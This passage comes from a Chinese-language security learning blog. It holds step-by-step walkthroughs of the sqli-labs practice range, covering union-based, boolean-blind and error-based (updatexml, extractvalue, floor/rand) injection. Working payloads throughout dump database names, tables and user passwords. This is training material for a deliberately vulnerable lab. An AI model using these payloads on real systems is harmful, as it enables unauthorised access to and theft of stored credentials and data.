alt="image-20230513221043279"></p><p>上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) union select 1 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224322394.png" alt="image-20230513224322394"></p><p>上面图片显示列数不正确，盲猜试试三列</p><p>2.判断字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224510771.png" alt="image-20230513224510771"></p><p>字段数为4时报错，说明字段数为3</p><p>3.判断回显</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224733973.png" alt="image-20230513224733973"></p><p>4.查看当前数据库和版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version() --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513224934066.png" alt="image-20230513224934066"></p><p>5.查看数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513230621168.png" alt="image-20230513230621168"></p><p>6.查看security库里面的表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231141345.png" alt="image-20230513231141345"></p><p>7.获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231403867.png" alt="image-20230513231403867"></p><p>8.字段数据</p><p>获取到字段后，根据字段获取表里的数据。字段名之间再加上*字符的十六进制，可以把账号密码隔开，容易区分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,group_concat(username,0x2a,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513231622174.png" alt="image-20230513231622174"></p><p>完成！！！</p><h4 id="sql-labs靶场less4"><a href="#sql-labs靶场less4" class="headerlink" title="sql-labs靶场less4"></a>sql-labs靶场less4</h4><p>在复习一下less4</p><p>less-3是单引号+右括号，less-4是双引号+右括号</p><p>1.判断注入点</p><p>一开始，？id=1 直接回显用户名和密码，</p><p>​              ？id=1’ 也是直接回显用户名和密码</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230513235842630.png" alt="image-20230513235842630"></p><p>在尝试一下别的符号</p><p>?id=1”  出现报错信息</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000027873.png" alt="image-20230514000027873"></p><p>错误提示是【”1””) LIMIT 0,1】，去掉自己输入的一个双引号后可以看出还有两个双引号和一个右括号，由此判可推出sql注入是由双引号和右括号和起来的闭合模式。</p><p>2.查字段名</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 4 --+</span><br></pre></td></tr></table></figure><p>后，提示超出列数，则尝试把4改成3，发现无报错，说明数据库查询语句查询列数为3列</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000300269.png" alt="image-20230514000300269"></p><p>3.查输出列的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514000817750.png" alt="image-20230514000817750"></p><p>4.查看当前数据库和版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version() --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001038494.png" alt="image-20230514001038494"></p><p>5.查看当前数据库下的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001411510.png" alt="image-20230514001411510"></p><p>6.查看user表下面的字段信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001554807.png" alt="image-20230514001554807"></p><p>7.查看字段数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,group_concat(username,0x2a,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514001730590.png" alt="image-20230514001730590"></p><p>完成！！！！！！</p><h4 id="sql-labs靶场less6"><a href="#sql-labs靶场less6" class="headerlink" title="sql-labs靶场less6"></a>sql-labs靶场less6</h4><p>1.判断注入点（双引号注入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and 1 --a   页面显示正常</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514203911904.png" alt="image-20230514203911904"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and 0 -- a   页面异常（空显示）</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514205048775.png" alt="image-20230514205048775"></p><p>2.判断字符长度</p><p>判断当前使用的数据库长度是否大于1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length(database())=8 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514221524192.png" alt="image-20230514221524192"></p><p>3.穷举字符</p><p>判断当前使用的数据库第一个字符的ascll码是否大于1（肯定大于），地址栏输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr(database(),1,1)) &gt; 1 -- a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and left(database(),1)=&#x27;s&#x27; --+</span><br><span class="line"></span><br><span class="line">用穷举的方法一个个列出来，....效率有点慢了</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514222128909.png" alt="image-20230514222128909"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and left(database(),8)=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514225957158.png" alt="image-20230514225957158"></p><p>4.判断库中每个表名的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 6--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232750125.png" alt="image-20230514232750125"></p><p>第一个表的长度是6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1)) = 8--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514232933832.png" alt="image-20230514232933832"></p><p>第二个表的长度为8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 2,1)) = 7--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233146882.png" alt="image-20230514233146882"></p><p>第三个表的长度为7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) = 5--+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233314642.png" alt="image-20230514233314642"></p><p>第四个表的长度为5</p><p>5.爆破表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt; 100 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233558822.png" alt="image-20230514233558822"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514233732069.png" alt="image-20230514233732069"></p><p>查看ascii表101是e，第一个表开头字母是e</p><p>…..此处省略一些步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115 --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230514234142010.png" alt="image-20230514234142010"></p><p>查看ascii表115是u，第一个表开头字母是u</p><p>….表名是users</p><h4 id="sql-labs靶场less7"><a href="#sql-labs靶场less7" class="headerlink" title="sql-labs靶场less7"></a>sql-labs靶场less7</h4><p>打开题目</p><p>1.判断是否是数字型传参</p><p>2.判断是否有单引号闭合</p><p>3.判断是否有双引号闭合</p><p>4.判断是否单引号+括号闭合</p><p>5.判断是否是双引号+括号闭合</p><p>如果以上都不是，那以上规则都同时加上sleep测试一遍，看是不是存在延时注入</p><p>先传入id=1试试呢</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210605853.png" alt="image-20230719210605853"></p><p>1.判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;    报错</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210730863.png" alt="image-20230719210730863"></p><p>输入单引号之后，页面报错，试试双引号</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719210918196.png" alt="image-20230719210918196"></p><p>select * from users where id=’1”‘会正确执行的</p><p>所以这里判断可能为单引号闭合字符型注入</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719211628016.png" alt="image-20230719211628016"></p><p>变为单引号之后页面还是报错，说明闭合不仅仅是单引号，可能还有其它字符，可能为<code>)</code>    )的个数也不确定</p><p>因为当输入select * from users  where id=(‘1’)时其实是可以正确执行的</p><p>先试试一个的吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719213838371.png" alt="image-20230719213838371"></p><p>一个）还是报错，试试两个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))  --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214110969.png" alt="image-20230719214110969"></p><p>页面正常显示了！！！说明闭合方式是’))</p><p>可以进行正常的注入其他语句。</p><p>2.先判断字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) order by 3 --+   正常</span><br><span class="line">?id=1&#x27;)) order by 4 --+   错误</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214818187.png" alt="image-20230719214818187"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214945753.png" alt="image-20230719214945753"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and length(database())  --+</span><br></pre></td></tr></table></figure><p>outfile前期条件：</p><p>在MySQL里面使用select … into outfile可以把数据导出到文本文件上<br>里面有几个参数<br>secure_file_priv 用来限制导出效果。他有三个属性：<br>null限制不能导出<br>为空可以自定义<br>为一个路径则只能导出到指定路径</p><p>具体设置在phpstudy中的配置文件mysql.ini中在最后一行加入 secure_file_priv即可c</p><h4 id="sql-labs靶场less8"><a href="#sql-labs靶场less8" class="headerlink" title="sql-labs靶场less8"></a>sql-labs靶场less8</h4><p>bool盲注常用的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">database()   显示数据库名称</span><br><span class="line">left(a,b)    从左侧截取a的前b位</span><br><span class="line">substr(a,b,c) 从b位置开始，截取字符串a到c的长度</span><br><span class="line">mid(a,b,c)  从b位置开始，截取a字符串的c位</span><br><span class="line">length()    返回字符串长度</span><br><span class="line">ascii()      将某个字符转换成ascii值</span><br><span class="line">char()       将ascii码转换为对应的字符</span><br></pre></td></tr></table></figure><p>打开源码看了一下</p><p>这道题可以使用时间盲注，不能使用报错注入，因为报错的信息被注释掉了</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515103641066.png" alt="image-20230515103641066"></p><p>1.判断注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1   页面正常，但是没有显示消息</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105031032.png" alt="image-20230515105031032"></p><p>加单引号</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105151868.png" alt="image-20230515105151868"></p><p>页面无回显，应该是报错了</p><p>继续试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2 页面都正常，说明不是数字型注入，</span><br><span class="line">?id=1&#x27; and 1=1 --+  页面正常，可以正常的显示</span><br><span class="line">    真      真    真</span><br><span class="line">?id=1&#x27; and 1=2 --+</span><br><span class="line">   真       假    假</span><br><span class="line">页面发生变化(没有报错，只是查不出来数据，和上面的无回显不一样)，说明是单引号闭合的字符型注入。</span><br></pre></td></tr></table></figure><p>1.查看数据库版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left(version(),1)=5 %23</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515112258415.png" alt="image-20230515112258415"></p><p>这个数据库的版本为5.7.42 ，上面的语句是看版本号的第一位是不是5，如果回显正常，那么说明第一位就是5</p><p>上图显示正常，剩下的慢慢测，一般使用脚本。</p><p>2.猜解数据库的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database(),1)&gt;&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515114347238.png" alt="image-20230515114347238"></p><p>数据库长度为 8 时，页面回显正常。这里说明下，长度要一个一个的试，这里只是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。</p><p>3.猜数据库名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left(databse(),1)&gt;&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure><p><code>left(a,b)</code>：返回a字符串从左至b位数，详细看下面用法</p><p>4.猜表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.猜字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure><p>6.猜数据</p><p>用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select username from users limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure><p>通过变换x，y的值可以得到所有的用户名 。</p><p>密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select password from users limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure><p>通过变换 x，y 的值可以得到所有的密码 。</p><p>通过布尔盲注手工注入比较繁琐，可以用脚本。</p><p>下面分享脚本</p><h4 id="sql-labs靶场less9"><a href="#sql-labs靶场less9" class="headerlink" title="sql-labs靶场less9"></a>sql-labs靶场less9</h4><h4 id="sql-labs靶场less10"><a href="#sql-labs靶场less10" class="headerlink" title="sql-labs靶场less10"></a>sql-labs靶场less10</h4><h4 id="sql-labs靶场less11"><a href="#sql-labs靶场less11" class="headerlink" title="sql-labs靶场less11"></a>sql-labs靶场less11</h4><h4 id="sql-labs靶场less12"><a href="#sql-labs靶场less12" class="headerlink" title="sql-labs靶场less12"></a>sql-labs靶场less12</h4><h4 id="sql-labs靶场less13"><a href="#sql-labs靶场less13" class="headerlink" title="sql-labs靶场less13"></a>sql-labs靶场less13</h4><h4 id="sql-labs靶场less14"><a href="#sql-labs靶场less14" class="headerlink" title="sql-labs靶场less14"></a>sql-labs靶场less14</h4><h4 id="sql-labs靶场less15"><a href="#sql-labs靶场less15" class="headerlink" title="sql-labs靶场less15"></a>sql-labs靶场less15</h4><h4 id="sql-labs靶场less16"><a href="#sql-labs靶场less16" class="headerlink" title="sql-labs靶场less16"></a>sql-labs靶场less16</h4><h4 id="sql-labs靶场less17"><a href="#sql-labs靶场less17" class="headerlink" title="sql-labs靶场less17"></a>sql-labs靶场less17</h4><h4 id="sql-labs靶场less18"><a href="#sql-labs靶场less18" class="headerlink" title="sql-labs靶场less18"></a>sql-labs靶场less18</h4><h4 id="sql-labs靶场less19"><a href="#sql-labs靶场less19" class="headerlink" title="sql-labs靶场less19"></a>sql-labs靶场less19</h4><h4 id="sql-labs靶场less20"><a href="#sql-labs靶场less20" class="headerlink" title="sql-labs靶场less20"></a>sql-labs靶场less20</h4><h4 id="sql-labs靶场less21"><a href="#sql-labs靶场less21" class="headerlink" title="sql-labs靶场less21"></a>sql-labs靶场less21</h4><h4 id="sql-labs靶场less22"><a href="#sql-labs靶场less22" class="headerlink" title="sql-labs靶场less22"></a>sql-labs靶场less22</h4><h4 id="sql-labs靶场less23"><a href="#sql-labs靶场less23" class="headerlink" title="sql-labs靶场less23"></a>sql-labs靶场less23</h4><h4 id="sql-labs靶场less24"><a href="#sql-labs靶场less24" class="headerlink" title="sql-labs靶场less24"></a>sql-labs靶场less24</h4><h4 id="sql-labs靶场less25"><a href="#sql-labs靶场less25" class="headerlink" title="sql-labs靶场less25"></a>sql-labs靶场less25</h4>]]></content>
      
      
      <categories>
          
          <category> 漏洞靶场学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>报错注入</title>
      <link href="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><p>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是SQL语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><h2 id="常见的函数"><a href="#常见的函数" class="headerlink" title="常见的函数"></a>常见的函数</h2><p>1.extractvalue()</p><p>2.updataxml()</p><p>3.count() + rand() +floor() +group  by() 导致的主键重复</p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue (xml_document,xpath_string)</p><p>第一个参数是xml文档对象名称</p><p>第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(null,concat(0x7e,(sqli_inject),0x7e))</span><br><span class="line"></span><br><span class="line">注：利用extractvalue()对数据进行一个排序，指定一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示&quot;-&quot;号。</span><br></pre></td></tr></table></figure><h2 id="UpdateXml函数"><a href="#UpdateXml函数" class="headerlink" title="UpdateXml函数"></a>UpdateXml函数</h2><p>函数用法：</p><p>UPDATEXML(XML_document,XPath_string,new_value)</p><p>三个字符串参数：</p><p>1  .XML_Document是String格式，为XML文档对象的名称</p><p>2   .XPath_string(<a href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a> 格式的字符串)</p><p>3    .new_value,string格式，替换查找到符合条件的数据</p><h3 id="为什么可以用于报错注入："><a href="#为什么可以用于报错注入：" class="headerlink" title="为什么可以用于报错注入："></a>为什么可以用于报错注入：</h3><p>UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了<a href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">子查询</a>，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码。</p><h2 id="sqli靶场less5"><a href="#sqli靶场less5" class="headerlink" title="sqli靶场less5"></a>sqli靶场less5</h2><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230514102049350.png" alt="image-20230514102049350"></p><p>1.判断注入类型</p><p>get 1’ and ’1’ =’1 回显如下：</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231110006.png" alt="image-20230510231110006"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231854074.png" alt="image-20230510231854074"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">？id=1’ </span><br><span class="line">报错，单引号导致，页面显示数据库的报错信息，确定注入点为单引号字符型</span><br></pre></td></tr></table></figure><p>2.判断报错函数是否可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id=0&#x27; and updatexml(1,0x7e)--a</span><br></pre></td></tr></table></figure><p>页面正常报错，确定报错函数可用</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232558988.png" alt="image-20230510232558988"></p><p>3.脱库</p><p>获取所有的数据库，地址栏输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,</span><br><span class="line">substr(</span><br><span class="line">      concat(0x7e,</span><br><span class="line">          (select group_concat(schema_name) </span><br><span class="line">          from information_schema.schemata)</span><br><span class="line">       )</span><br><span class="line">,34,31)</span><br><span class="line">,3) -- a</span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232905062.png" alt="image-20230510232905062"></p><p>获取security库中的所有表，地址栏输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;))) %23</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233507675.png" alt="image-20230510233507675"></p><p>查user表中的列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">？id=1&#x27; union select 1,2, (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)),1)) %23</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233925272.png" alt="image-20230510233925272"></p><p>查字段（双查询注入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1, count(*), concat((select concat(username,&#x27;:&#x27;,password) from users  limit 0,1), floor(rand(0)*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234240463.png" alt="image-20230510234240463"></p><p>将0改为1,2,3,4……..</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234427307.png" alt="image-20230510234427307"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234518718.png" alt="image-20230510234518718"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234547823.png" alt="image-20230510234547823"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234636472.png" alt="image-20230510234636472"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/05/07/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/07/sql%E6%B3%A8%E5%85%A5/</url>
      
